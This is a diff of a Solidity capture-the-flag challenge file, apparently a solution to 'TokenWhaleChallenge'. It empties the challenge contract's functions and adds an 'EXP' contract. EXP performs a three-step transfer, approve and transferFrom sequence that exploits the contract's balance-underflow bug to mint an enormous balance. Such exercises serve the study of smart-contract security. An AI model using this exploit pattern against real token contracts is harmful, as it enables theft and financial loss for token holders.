@@ -11,45 +11,38 @@ contract TokenWhaleChallenge {
     string public symbol = "SET";
     uint8 public decimals = 18;
 
-    function TokenWhaleChallenge(address _player) public {
-        player = _player;
-        totalSupply = 1000;
-        balanceOf[player] = 1000;
-    }
+    function TokenWhaleChallenge(address _player) public {}
 
-    function isComplete() public view returns (bool) {
-        return balanceOf[player] >= 1000000;
-    }
+    function isComplete() public view returns (bool) {}
 
     event Transfer(address indexed from, address indexed to, uint256 value);
 
-    function _transfer(address to, uint256 value) internal {
-        balanceOf[msg.sender] -= value;
-        balanceOf[to] += value;
+    function _transfer(address to, uint256 value) internal {}
 
-        emit Transfer(msg.sender, to, value);
-    }
-
-    function transfer(address to, uint256 value) public {
-        require(balanceOf[msg.sender] >= value);
-        require(balanceOf[to] + value >= balanceOf[to]);
-
-        _transfer(to, value);
-    }
+    function transfer(address to, uint256 value) public {}
 
     event Approval(address indexed owner, address indexed spender, uint256 value);
 
-    function approve(address spender, uint256 value) public {
-        allowance[msg.sender][spender] = value;
-        emit Approval(msg.sender, spender, value);
+    function approve(address spender, uint256 value) public {}
+
+    function transferFrom(address from, address to, uint256 value) public {}
+}
+
+contract EXP {
+    TokenWhaleChallenge victim;
+    constructor(address _addr){
+        victim  = TokenWhaleChallenge(_addr);
     }
 
-    function transferFrom(address from, address to, uint256 value) public {
-        require(balanceOf[from] >= value);
-        require(balanceOf[to] + value >= balanceOf[to]);
-        require(allowance[from][msg.sender] >= value);
+    function setp1_transfer_A_to_B(address _addrB) public payable {
+        victim.transfer(_addrB, 510);
+    }
 
-        allowance[from][msg.sender] -= value;
-        _transfer(to, value);
+    function setp2_approveA(address _addrA) public payable {
+        victim.approve(_addrA, 1000);
+    }
+
+    function setp3_final_exp(address _addrB) public payable {
+        victim.transferFrom(_addrB, _addrB, 490);
     }
 }
